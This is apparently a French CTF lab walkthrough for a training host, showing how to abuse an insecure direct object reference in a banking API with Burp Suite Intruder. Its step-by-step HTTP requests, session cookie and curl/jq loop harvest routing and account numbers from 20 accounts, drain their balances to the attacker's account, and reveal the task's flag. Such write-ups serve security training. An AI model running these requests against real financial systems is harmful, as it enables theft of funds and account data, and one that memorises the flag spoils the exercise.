# Task 2 - Wire Transfer IDOR avec Burp Suite Intruder

## 🎯 Objectif
Exploiter la vulnérabilité IDOR sur l'endpoint de transfert d'argent pour atteindre un solde de $10,000+ et récupérer le flag_2.

## 📋 Prérequis

### Information nécessaires
- **Session Cookie** : Votre cookie de session valide
- **Mon Account ID** : L'ID de votre compte (destination des transferts)
- **Liste des comptes victimes** : 20 account IDs à exploiter

### Récupération des informations

#### 1. Cookie de session
```bash
# Dans le navigateur (F12 → Application → Cookies)
session=15qv66KhXbXeu1oAH91prTQxjcZACpV57yhb_HwfvLA.R-tQStxr52i60x3guGyJIw4p0BA
```

#### 2. Votre Account ID
```bash
curl -H "Cookie: session=YOUR_SESSION" http://web0x06.hbtn/api/customer/info/me
# Récupérer le champ "account_id"
```

#### 3. Liste des comptes victimes
```bash
curl -H "Cookie: session=YOUR_SESSION" http://web0x06.hbtn/api/customer/contacts
# Extraire tous les "account_id" des contacts
```

## 🔧 Configuration de Burp Suite Intruder

### Étape 1 : Capture de la requête de transfert

1. Ouvrir Burp Suite et activer le Proxy
2. Configurer le navigateur pour utiliser le proxy Burp (127.0.0.1:8080)
3. Aller sur http://web0x06.hbtn
4. Effectuer UN transfert manuel vers votre compte :
   - Source : Un compte victime quelconque
   - Destination : Votre compte
   - Montant : 1 (pour tester)
5. La requête apparaît dans Burp → Proxy → HTTP History
6. Clic droit sur la requête → "Send to Intruder"

### Étape 2 : Configuration d'Intruder

#### Target
```
Host: web0x06.hbtn
Port: 80
```

#### Positions

**1. Requête POST capturée** :
```http
POST /api/accounts/transfer_to/4205e985b0a040dd8e9f97b16de2b3f3 HTTP/1.1
Host: web0x06.hbtn
Cookie: session=15qv66KhXbXeu1oAH91prTQxjcZACpV57yhb_HwfvLA.R-tQStxr52i60x3guGyJIw4p0BA
Content-Type: application/json
Content-Length: 123

{
  "amount": 500,
  "raison": "transfert",
  "account_id": "ACCOUNT_ID_PLACEHOLDER",
  "routing": "ROUTING_PLACEHOLDER",
  "number": "NUMBER_PLACEHOLDER"
}
```

**2. Définir les positions de payload** :
- Cliquer sur "Clear §" pour effacer les positions par défaut
- Sélectionner `ACCOUNT_ID_PLACEHOLDER` → "Add §"
- Sélectionner `ROUTING_PLACEHOLDER` → "Add §"
- Sélectionner `NUMBER_PLACEHOLDER` → "Add §"

**3. Attack type** : 
- Sélectionner **"Pitchfork"** (permet d'utiliser plusieurs listes en parallèle)

#### Payloads

**IMPORTANT** : Avec Pitchfork, chaque payload set correspond à une position marquée.

##### Payload Set 1 : Account IDs (20 valeurs)
```
10f2416b9735441da5dfba2ea7f67f87
6e069c1640ae4d34b5ddb39219227d07
6235fb53768844569f34de12691841ac
3bd521f0f32f4b6dbdecabaf0ab424ec
9150364551264e5e9aa91f23afa6ac45
575cec7273a84ec083b079c12821b13f
c9e4e215668d4dd0890c7bd1da1542aa
2f5715147c9c48ad890d979481a57e6e
c640ad25c84543feb9a4a7dc6c7de7a2
f14899a124034ba29fa1cb6ded4c2db4
d80476ce166a440d8e1bf7839ba852a1
759a09337bdc4db6964e75d56c3a1f1f
639a9bb3137346d1a5de67c6f994b651
030abd8efa7a4cb3b0522e55c06dcb41
7087770b22bd48fc9fc0dd62c1f33c67
991d7640e2d14cc894b080a4f0908b3b
df085024fdd24d1f8093b18d20f6530f
2cea9ef9b46141ff9d4899c4b8c2098c
ba517ef4ae394b9ebfc1227502562e4f
b4eb32ac21e34edca774ed9210f4922e
```

##### Payload Set 2 : Routing Numbers
**Problème** : On ne connaît pas les routing numbers à l'avance !

**Solution en 2 phases** :

### 🔄 PHASE 1 : Récupération des credentials

**Objectif** : Récupérer routing + number pour chaque account_id

#### Configuration Intruder Phase 1

**Requête** :
```http
GET /api/accounts/info/§ACCOUNT_ID§ HTTP/1.1
Host: web0x06.hbtn
Cookie: session=15qv66KhXbXeu1oAH91prTQxjcZACpV57yhb_HwfvLA.R-tQStxr52i60x3guGyJIw4p0BA
```

**Attack type** : Sniper (une seule position)

**Payloads** : Liste des 20 account IDs

**Extraction des résultats** :
1. Lancer l'attaque
2. Pour chaque réponse, extraire manuellement :
   ```json
   {
     "message": {
       "routing": "106190002",
       "number": "107991601992",
       "balance": 113.5
     }
   }
   ```
3. Créer un fichier CSV avec les 3 valeurs :
   ```csv
   account_id,routing,number,balance
   10f2416b9735441da5dfba2ea7f67f87,106190002,107991601992,113.5
   ...
   ```

### 💰 PHASE 2 : Exploitation des transferts

**Maintenant qu'on a toutes les credentials** :

#### Configuration Intruder Phase 2

**Requête** :
```http
POST /api/accounts/transfer_to/4205e985b0a040dd8e9f97b16de2b3f3 HTTP/1.1
Host: web0x06.hbtn
Cookie: session=15qv66KhXbXeu1oAH91prTQxjcZACpV57yhb_HwfvLA.R-tQStxr52i60x3guGyJIw4p0BA
Content-Type: application/json

{
  "amount": §AMOUNT§,
  "raison": "transfert",
  "account_id": "§ACCOUNT_ID§",
  "routing": "§ROUTING§",
  "number": "§NUMBER§"
}
```

**Attack type** : Pitchfork (4 payloads en parallèle)

**Payload Sets** :
1. **Amount** : balance - 1 pour chaque compte
2. **Account ID** : Les 20 IDs
3. **Routing** : Les 20 routing numbers correspondants
4. **Number** : Les 20 account numbers correspondants

**Configuration des payloads** :
- Payload Set 1 (Amount) : Simple list
  ```
  112
  455
  789
  ...
  ```
- Payload Set 2 (Account ID) : Simple list (les 20 IDs)
- Payload Set 3 (Routing) : Simple list (les 20 routing)
- Payload Set 4 (Number) : Simple list (les 20 numbers)

#### Options importantes

**Request Engine** :
- Number of threads : 1 (pour éviter le rate limiting)
- Delay between requests : 500 ms

**Redirections** :
- Follow redirections : Always

### Étape 3 : Lancer l'attaque

1. Vérifier que tous les payloads sont correctement configurés
2. Cliquer sur "Start attack"
3. Une fenêtre s'ouvre avec les résultats en temps réel

### Étape 4 : Analyse des résultats

#### Recherche du flag

**Méthode 1 - Grep dans Intruder** :
1. Options → Grep - Extract
2. Add → Chercher "flag_2" dans une réponse réussie
3. Extraire la valeur

**Méthode 2 - Filtrage manuel** :
1. Trier par Status Code (200 = succès)
2. Regarder la colonne "Length" pour repérer les réponses différentes
3. Cliquer sur chaque ligne → Response → Raw
4. Chercher "flag_2"

**Méthode 3 - Vérification finale** :
```bash
curl -H "Cookie: session=YOUR_SESSION" http://web0x06.hbtn/api/customer/info/me
```
Chercher "flag_2" dans la réponse si le solde > $10,000

## 📊 Résultat attendu

### Réponse de transfert réussi
```json
{
  "status": "success",
  "message": "Transfer completed successfully",
  "new_balance": 1615.8
}
```

### Réponse avec le flag
```json
{
  "status": "success",
  "flag_2": "f8d657cfaa33318f86731fadc3d90689",
  "total_balance": 10234.5
}
```

## 🎯 Tips & Tricks

### Automatisation du CSV
Au lieu de remplir manuellement, utiliser un petit script :
```bash
#!/bin/bash
for id in $(cat account_ids.txt); do
    curl -s -H "Cookie: session=$SESSION" \
         "http://web0x06.hbtn/api/accounts/info/$id" \
         | jq -r ".message | \"$id,\(.routing),\(.number),\(.balance)\""
done > credentials.csv
```

### Import dans Burp
1. Copier le CSV
2. Dans Burp Intruder → Payloads
3. Paste → Split automatiquement par ligne

### Vérification rapide
```bash
# Solde actuel
curl -s -H "Cookie: session=$SESSION" \
     http://web0x06.hbtn/api/customer/info/me | jq .total_balance
```

## ⚠️ Points d'attention

1. **Session expirée** : Si les requêtes échouent, récupérer un nouveau cookie
2. **Rate limiting** : Mettre un délai de 500ms entre chaque requête
3. **Comptes vides** : Si tous les comptes sont à $0, restart le container
4. **Mauvais account_id** : Vérifier que vous utilisez les nouveaux IDs après restart
5. **Flag non trouvé** : Le flag_2 apparaît quand balance > $10,000

## 🏆 Validation

### Checker le flag
```bash
cat 2-flag.txt
# Doit contenir : f8d657cfaa33318f86731fadc3d90689
```

### Commit
```bash
git add 2-flag.txt
git commit -m "Task 2: IDOR wire transfer exploitation complete"
git push
```

## 📝 Comparaison Python vs Burp

### Avantages Burp Intruder
- ✅ Interface graphique intuitive
- ✅ Visualisation en temps réel
- ✅ Pas besoin de coder
- ✅ Filtering et sorting des résultats
- ✅ Grep pour extraire automatiquement

### Inconvénients Burp Intruder
- ❌ Configuration en 2 phases (récup credentials puis transfert)
- ❌ Création manuelle du CSV
- ❌ Plus lent que Python
- ❌ Version gratuite limitée en vitesse
- ❌ Pas d'automatisation complète

### Avantages Python
- ✅ Automatisation complète en 1 script
- ✅ Plus rapide
- ✅ Récupération automatique des credentials
- ✅ Sauvegarde automatique du flag
- ✅ Réutilisable facilement

## 🎓 Apprentissage

Cette tâche démontre :
1. **IDOR sur action critique** : Transfert d'argent sans vérification du propriétaire
2. **Exploitation en chaîne** : Récupération d'infos → utilisation pour exploit
3. **Rate limiting** : Importance de gérer la vitesse des requêtes
4. **Session management** : Comprendre les cookies et leur validité

## 🔗 Ressources

- [PortSwigger - IDOR Tutorial](https://portswigger.net/web-security/access-control/idor)
- [Burp Intruder Documentation](https://portswigger.net/burp/documentation/desktop/tools/intruder)
- [OWASP - IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
